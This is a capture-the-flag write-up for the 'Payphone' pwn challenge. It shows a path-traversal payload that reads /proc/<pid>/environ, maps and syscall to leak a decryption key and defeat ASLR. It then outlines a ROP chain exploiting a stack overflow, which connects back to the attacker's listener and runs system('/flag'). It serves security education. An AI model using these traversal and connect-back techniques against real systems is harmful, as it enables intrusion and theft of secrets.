# Payphone

**Category:** Pwn | **Flag:** `HZ{https://youtu.be/KRaWnd3LJfs?si=_xHmFbMS-KfXCxWk}`

> The flag really is a rickroll link — that is the author's intended flag.

## Challenge Description

A two-stage challenge:

1. Recover the password needed to decrypt the real challenge files.
2. Exploit the decrypted binary and run `/flag`.

The Payphone website connects back to any public TCP listener you supply and
returns a "recording" URL. While its temporary dialer process waits for your
listener, the site also lets you read files outside its recordings folder.

## Initial Analysis

The only handout is an encrypted bundle:

```text
payphone-binaries.tar.zst.enc
```

The site takes a host/port and returns something like:

```json
{ "recording": "/api/recording?name=TEAM_ID/39329" }
```

The trailing number is the **PID** of the temporary dialer process.

## The Vulnerability / Core Concept

**Stage 1 — path traversal / LFI leaks the bundle key.** `/api/recording` joins
its `name` parameter to the recordings directory without rejecting `..`. Start a
listener, place a call, and deliberately send nothing so the dialer stays alive;
then read its environment via the leaked PID:

```text
/api/recording?name=../../../../../../proc/<dialer-pid>/environ
```

This yields `PAYPHONE_BUNDLE_KEY=...`, which decrypts the bundle:

```bash
openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -md sha256 \
  -pass env:PAYPHONE_BUNDLE_KEY \
  -in payphone-binaries.tar.zst.enc -out payphone-binaries.tar.zst
tar --use-compress-program=unzstd -xf payphone-binaries.tar.zst
```

Inside: `payphone-dial`, `libc.so.6`, `ld-linux-x86-64.so.2` (see `bin/`).

**Stage 2 — stack overflow in `payphone-dial`.** The binary reads a host/port,
connects out, then reads a message as `[2-byte big-endian length][body]`. The
body is copied into a fixed stack buffer with no length check, and the saved
return address is `0x398` bytes into the body. Protections: PIE, NX, partial
RELRO, **no stack canary**.

**ASLR bypass reuses the same LFI.** While the dialer is blocked reading the
2-byte length, these files leak everything needed:

```text
/proc/<dialer-pid>/maps      -> libc base
/proc/<dialer-pid>/syscall   -> read(fd, buf, 2): the connected FD and buf addr
```

The vulnerable body buffer starts `0x10` bytes after the leaked `buf`.

## Exploitation

Full exploit in `solve.py` (`local` / `remote` subcommands). The dialer sends
`PAYPHONE-ACK` and **closes the first connection** before returning through the
overwritten return address, so the flag cannot come back over the original
socket. The listener therefore accepts **two** connections, and the ROP chain
opens a fresh one (the just-closed FD number is reused by the new `socket()`):

```c
socket(AF_INET, SOCK_STREAM, 0);
connect(fd, &listener_addr, 16);
dup2(fd, STDOUT_FILENO);
system("/flag");
exit(0);
```

Arguments are loaded with `pop rdi/rsi/rdx` gadgets from the supplied libc, with
`ret` gadgets inserted to keep SysV stack alignment. The `sockaddr` and the
`/flag` string are appended to the same overflowing body at fixed offsets
(`SOCKADDR_OFFSET`, `CMD_OFFSET`); since `/proc/<pid>/syscall` leaked the exact
buffer address, the chain points directly at them.

```bash
./solve.py local                                   # local proof (system("cat /flag"))
./solve.py remote --public-ip <YOUR_IP> --bind-port 41005
```

Local mode drives the bundled loader/libc and confirms the two-callback ROP end
to end. Remote mode runs `/flag` and receives its output on the second callback.

> Note: the `HOST`/`HOST_IP` constants and the platform auth cookie in
> `solve.py` are placeholders — supply the live instance details and your
> platform session cookie at run time.

## Flag

`HZ{https://youtu.be/KRaWnd3LJfs?si=_xHmFbMS-KfXCxWk}`

## Key Takeaways

- A "read a recording" endpoint that trusts `..` becomes an arbitrary file read,
  and `/proc/<pid>/{environ,maps,syscall}` turns that into secret exfiltration
  and a complete ASLR bypass.
- `/proc/<pid>/syscall` is a precise leak: it reveals the exact buffer pointer
  and FD a blocked process is using right now.
- When the exploited process closes its socket before returning, reconnect from
  inside the ROP chain — the freed FD number is conveniently reused.
